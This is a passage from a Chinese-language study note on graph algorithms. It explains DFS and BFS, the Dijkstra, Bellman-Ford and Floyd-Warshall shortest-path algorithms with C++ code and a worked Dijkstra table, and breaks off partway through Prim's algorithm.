是一个典型的<strong>递归过程</strong>，用对规模小的图的遍历问题解决大图遍历问题。<br><strong>实现</strong>：<br>深度优先，就是开bool数组吧…递归只要做到”来过“就可以了。</li></ul><p>从指定点开始深度优先遍历，我们先把一个点变成 true ，从它开始…</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">DFS</span><span class="token punctuation">(</span>Graph G<span class="token punctuation">,</span> <span class="token keyword">int</span> v<span class="token punctuation">,</span> <span class="token keyword">bool</span> visited<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    visited<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token comment">// 标记当前点已访问</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>每一个与 v 相邻的顶点 u<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">DFS</span><span class="token punctuation">(</span>G<span class="token punctuation">,</span> u<span class="token punctuation">,</span> visited<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 递归访问未访问的邻居</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BFS">BFS</h3><p>广度优先遍历。<br><img src="/images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE/20250401110701225.png" alt=""><br><strong>访问方式</strong>：</p><ul><li>从选中的某一个未访问过的顶点出发，访问并对该顶点加已访问标志。</li><li>依次对该顶点的未被访问过的第1个、第2个、第3个……第 k 个邻接点 v1、v2 、v3…… vk进行访问且加已访问标志。</li><li>依次对顶点 v1 、v2、v3…… vk转向操作2。</li><li>如果还有顶点未被访问过，选中其中一个顶点作为起始顶点，再次转向1。如果 所有的顶点都被访问到，遍历结束。</li></ul><blockquote><p>与深度优先不太一样的是，广度优先像是 “访问邻居“，确保从一个点出发，所有与该点连接的点都遍历到，然后再跳转下一点。</p></blockquote><p><strong>注意</strong>：</p><ul><li>广度优先遍历结果不唯一。</li><li><strong>广度优先遍历不是递归过程</strong>，它更像是一个对点的逐个访问。<br><strong>实现</strong>：</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">BFS</span><span class="token punctuation">(</span>Graph G<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">bool</span> visited<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> q<span class="token punctuation">;</span>    visited<span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 起点入队</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> v <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 取出当前点</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>每一个与 v 相邻的顶点 u<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                visited<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token comment">// 标记为已访问</span>                q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 邻居入队</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="应用">应用</h2><h3 id="最短路径问题（Dijkstra，Bellman-Ford，Floyd-Warshall）">最短路径问题（Dijkstra，Bellman-Ford，Floyd-Warshall）</h3><p><strong>定义</strong>：在最短路径问题中，给定一个带有权值的有向图 G=(V,E)，令w(u,v)表示边(u,v)的权值。图中一条路径p=&lt;v_0,v_1,…,v_k&gt;的权值w(p)是构成该路径的所有边的权值之和，在所有的从顶点u到顶点v的路径当中，权值最小的那条路径称之为从u到v的最短路径。<br><em>说白了就是每次都走权值最大or最小的路径。最后整条路径是权值最大or最小的。</em></p><p><strong>重要性质</strong>：给定两个顶点之间的一条最短路径，则在该路径上任意两个点的路径都是最短的，这种最短子路径称为最优子结构。<br><em>一条大路是最优解，那么每条小路都是最优解。</em></p><p>我们用动态规划，Dijkstra算法的基础，就是基于这个“每条小路最优解”。</p><h4 id="问题：-一条最短路径能包含环路吗？">问题： 一条最短路径能包含环路吗？</h4><p>答：<strong>不能。绝不行。不管环的权值是负的、正的，还是零，全都不行。</strong></p><h5 id="如果环的权值是负数-这玩意最危险）">如果环的权值是负数 (这玩意最危险）</h5><p>假设你从 A 出发，走到某个地方遇到了一个负权环，也就是说，这个环越绕越“省钱”。<br>那干嘛不在这个环里绕一百万圈，搞个负无穷大？你这什么最短路径，明明还可以更短！<br>只要<strong>图里能从起点走到一个负权环，那你永远也找不到真正的最短路径</strong>，<br>结论：负权环 = 最短路径永远没完没了。</p><h5 id="如果环的权值是正数（这玩意没啥用）">如果环的权值是正数（这玩意没啥用）</h5><p>你走了一条路，中间绕了个小贵环回来，然后再继续走。<br>那你为啥要走那个贵环？你删掉它不是省更多？<br><strong>只要路径里有正权环，你都可以删掉它，剩下的路更短。</strong><br>结论：正权环 = 拖后腿，没必要。</p><h5 id="如果环的权值是-0（-这玩意最容易骗你）">如果环的权值是 0（ 这玩意最容易骗你）</h5><p>你以为走这个 0 环“也没多付钱啊”，那可太天真了。<br>虽然它不会让路径更差，但它也不会让路径更好，<br><strong>而且它让你走了一圈纯属浪费感情。</strong><br>结论：0 权环 = 没损失但也没价值，是废环，删了也不影响最短路径。</p><h4 id="Dijkstra算法">Dijkstra算法</h4><p>手写作业写最短路径的时候，按教材那个表达来。<br>遍历+贪心。<br>流程：</p><ul><li>Dijkstra 每一轮都更新「从源点到某节点的所有可能路径」，<strong>只取当前最短那一条</strong>，<strong>并不是</strong>依赖于上一条选好的线路而贪心增加。（比如选好了&lt;4,2,3&gt;是4到3最短，再看4到6的时候，除了要看&lt;4,2,3,6&gt;,可能还要看&lt;4,6&gt;,&lt;4,2,6&gt;等等…）</li></ul><p>实例：<br><img src="https://img.moyuin.top/i/2025/04/21/6806420d215bc.png" alt="题目"><br><em>顺便给一下教材写法，考试格式…</em><br><img src="https://img.moyuin.top/i/2025/04/21/680644fd78993.png" alt="image.png"></p><ul><li>标记（舍）是因为比已知存在路径要权重大，因此不作为下个未标记点的路径。</li></ul><table><thead><tr><th style="text-align:center">终点</th><th style="text-align:left">i=1</th><th style="text-align:left">i=2</th><th style="text-align:left">i=3</th><th style="text-align:left">i=4</th><th style="text-align:left">i=5</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:left">⟨4,1⟩20</td><td style="text-align:left">⟨4,2,1⟩15</td><td style="text-align:left"></td><td style="text-align:left">⬛ ⟨4,6,1⟩12</td><td style="text-align:left"></td></tr><tr><td style="text-align:center">2</td><td style="text-align:left">⬛ ⟨4,2⟩5</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">3</td><td style="text-align:left"></td><td style="text-align:left">⬛ ⟨4,2,3⟩8</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">5</td><td style="text-align:left">⬛ ⟨4,5⟩11</td><td style="text-align:left"></td><td style="text-align:left">⟨4,2,3,5⟩23(舍)</td><td style="text-align:left">⟨4,6,5⟩13</td><td style="text-align:left"></td></tr><tr><td style="text-align:center">6</td><td style="text-align:left">⬛ ⟨4,6⟩10</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">u(选好的最短路径节点)</td><td style="text-align:left">2</td><td style="text-align:left">3</td><td style="text-align:left">6</td><td style="text-align:left">5</td><td style="text-align:left">1</td></tr><tr><td style="text-align:center">s(已确定最短路径的节点集合)</td><td style="text-align:left">{4,2}</td><td style="text-align:left">{4,2,3}</td><td style="text-align:left">{4,2,3,6}</td><td style="text-align:left">{4,2,3,6,5}</td><td style="text-align:left">{4,2,3,6,5,1}</td></tr><tr><td style="text-align:center">最终结果（最短路径）：</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><ul><li>v1：⟨4,6,1⟩，dist=12</li><li>v2：⟨4,2⟩，dist=5</li><li>v3：⟨4,2,3⟩，dist=8</li><li>v5：⟨4,5⟩，dist=11</li><li>v6：⟨4,6⟩，dist=10</li></ul><p>代码实现（这里是把所有点到点的距离全部计入了）：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">dijkstra</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> graph<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">dist</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> INF<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 存储起点到各点的最短距离</span>    vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">visited</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 标记哪些点已经确定最短路径</span>    dist<span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 起点到自己的距离是0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> u <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minDist <span class="token operator">=</span> INF<span class="token punctuation">;</span>        <span class="token comment">// 找当前未访问的点中，距离起点最近的那个</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> minDist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                u <span class="token operator">=</span> j<span class="token punctuation">;</span>                minDist <span class="token operator">=</span> dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>u <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// 如果没找到说明剩下的都不可达，结束</span>        visited<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 标记这个点已经确定最短路径</span>        <span class="token comment">// 更新与u相邻的点的距离</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> v <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> v <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> v<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> graph<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">!=</span> INF<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dist<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> graph<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">&lt;</span> dist<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    dist<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> dist<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> graph<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 输出结果</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> INF<span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"从"</span> <span class="token operator">&lt;&lt;</span> start <span class="token operator">&lt;&lt;</span> <span class="token string">"到"</span> <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">"：不可达"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"从"</span> <span class="token operator">&lt;&lt;</span> start <span class="token operator">&lt;&lt;</span> <span class="token string">"到"</span> <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">"：最短距离 = "</span> <span class="token operator">&lt;&lt;</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h4 id="Bellman-Ford算法">Bellman-Ford算法</h4><p><strong>核心思想</strong>：Bellman-Ford算法通过对边进行<strong>松弛的方式</strong>渐近地求出<strong>源顶点s到其余顶点v</strong>的最短路径距离。</p><ul><li><strong>Dijkstra 不支持负权边</strong>（就是边的权值可以是负数）</li><li><strong>Bellman-Ford 可以！</strong></li></ul><blockquote><p>Bellman-Ford 的核心机制就是：<br><strong>“你别急，我帮你把路径松弛 V-1 次。”</strong><br>啥叫“松弛”？不是拉筋，是更新路径：</p></blockquote><p>每次松弛，就是尝试：</p><blockquote><p>“如果从 A 到 B 这条边能让 B 的最短距离更小，我就更新一下到达 B 的最短距离。”</p></blockquote><p>你把图里所有边一遍一遍扫，<br>每发现能更新的路径，就更新。<br>重复这个过程 <strong>V-1 次</strong>（V = 点的数量）。</p><p>因为最短路径最多经过 V-1 条边，<br>再多就是环了，你就绕圈圈了。</p><blockquote><p>“如果我松弛了 V-1 次还没完，<br>第 V 次还能继续更新，那说明你有 <strong>负权环</strong>，无限省钱大骗局，整个图炸了。”</p></blockquote><p>代码实现：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">bellmanFord</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>Edge<span class="token operator">></span><span class="token operator">&amp;</span> edges<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> dist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    dist<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> INF<span class="token punctuation">)</span><span class="token punctuation">;</span>    dist<span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 进行 n-1 次松弛操作</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> edge <span class="token operator">:</span> edges<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dist<span class="token punctuation">[</span>edge<span class="token punctuation">.</span>u<span class="token punctuation">]</span> <span class="token operator">!=</span> INF <span class="token operator">&amp;&amp;</span> dist<span class="token punctuation">[</span>edge<span class="token punctuation">.</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> edge<span class="token punctuation">.</span>w <span class="token operator">&lt;</span> dist<span class="token punctuation">[</span>edge<span class="token punctuation">.</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                dist<span class="token punctuation">[</span>edge<span class="token punctuation">.</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> dist<span class="token punctuation">[</span>edge<span class="token punctuation">.</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> edge<span class="token punctuation">.</span>w<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 第n次松弛，检测是否还有可以更新的——有就代表存在负权回路</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> edge <span class="token operator">:</span> edges<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>dist<span class="token punctuation">[</span>edge<span class="token punctuation">.</span>u<span class="token punctuation">]</span> <span class="token operator">!=</span> INF <span class="token operator">&amp;&amp;</span> dist<span class="token punctuation">[</span>edge<span class="token punctuation">.</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> edge<span class="token punctuation">.</span>w <span class="token operator">&lt;</span> dist<span class="token punctuation">[</span>edge<span class="token punctuation">.</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 有负权环</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 成功，没有负权环</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有负权环没答案。答案存在 dist 数组里。</p><hr><h4 id="Floyd-Warshall算法">Floyd-Warshall算法</h4><p><strong>算法介绍</strong>：Floyd-Warshall算法是一种动态规划算法，能解决<strong>所有顶点对最短路径</strong>问题，运行时间为O(|V|^3)，能够处理权值为负的边。<br><strong>代码更短。</strong></p><p><strong>核心思想</strong>：如果你想让 i 到 j 更短，那试试看从 i 到 k 再到 j 会不会更便宜。</p><blockquote><p>你有一张图，任意两点之间的最短路径你都想知道，一个一个试太累，那你干脆：<br><strong>让每个点都轮流当“中转站”，看看是不是能让两点之间的距离变短。</strong></p></blockquote><p><strong>本质</strong>：<br>你要更新的路径是 <code>dist[i][j]</code>，<br>每当你发现：<br><code>dist[i][j] &gt; dist[i][k] + dist[k][j]</code></p><p>你就做一次松弛<br><code>dist[i][j] = dist[i][k] + dist[k][j];</code></p><p>代码不太优雅：<br><em>从 i 到 j，如果我中转一下 k，是不是更便宜？</em></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>k<span class="token punctuation">)</span>  <span class="token comment">// 中转点</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token comment">// 起点</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span><span class="token comment">// 终点</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dist<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dist<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不能有负环，否则结果会出事（无限套现）。</p><hr><h3 id="最小生成树（最小支撑树）问题（生成MST）">最小生成树（最小支撑树）问题（生成MST）</h3><p><strong>定义</strong>：给定一个连通的加权图G=(V,E)，其中V为顶点的集合，E为边的集合，其中E中的每条边都有一个非负的权值。最小生成树问题是在G中<strong>求解权值最小的生成树</strong>（MST）。</p><h4 id="Prim算法">Prim算法</h4><p>是一个贪心算法，构造树的时候，每次都是选择权值最小的路径连接点与点。<br>一个点出发，慢慢往外连边，每次都选：</p><blockquote><p><strong>“从已经连接好的点，到外面去的边中，最短的那一条。”</strong></p></blockquote><p>prim算法和Dijkstra算法的思想很像很像，不过一个是关注<strong>单纯点到点的路径的权值</strong>，一个是关注<strong>从源点到该点的路径和</strong>。也要注意保留<strong>未选取路径中指向未选取点的</strong>。</p><p>照样<strong>不能去成环</strong>，理由和最短路径的那个一样的。</p><h5 id="代码实现：">代码实现：</h5><ul><li>代码总览：(邻接矩阵实现)</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;climits></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> INF <span class="token operator">=</span> INT_MAX<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token comment">// 最大顶点数</span><span class="token keyword">int</span> graph<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 邻接矩阵</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span><span class="token function">visited</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 标记是否加入MST，哪些点已经被我们选了</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token function">dist</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span>INF<span class="token punctuation">)</span>     <span class="token comment">// 到MST的最小边权值，初始每个点都贵得离谱</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>           <span class="token comment">// 顶点数量</span><span class="token keyword">int</span> <span class="token function">prim</span><span class="token punctuation">(</span><span class="token keyword">int</span> start<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    dist<span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> totalWeight <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token comment">//给每一个点找最便宜的权值,处理后加上去</span>        <span class="token keyword">int</span> u <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> minDist <span class="token operator">=</span> INF<span class="token punctuation">;</span>        <span class="token comment">//从还没选的点中选一个最便宜的</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> minDist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                minDist <span class="token operator">=</span> dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                u <span class="token operator">=</span> j<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>u <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// 找不到了，说明不连通</span>        visited<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 找到了，标记一下，下次不选它了，不然有可能形成环路</span>        totalWeight <span class="token operator">+=</span> dist<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 加一下找到的u点出发最短权值</span>        <span class="token comment">// 更新从点 u 出发可以到达的，但还没去过的其他点的，权值，便于下次选择最短路径</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> v <span class="token 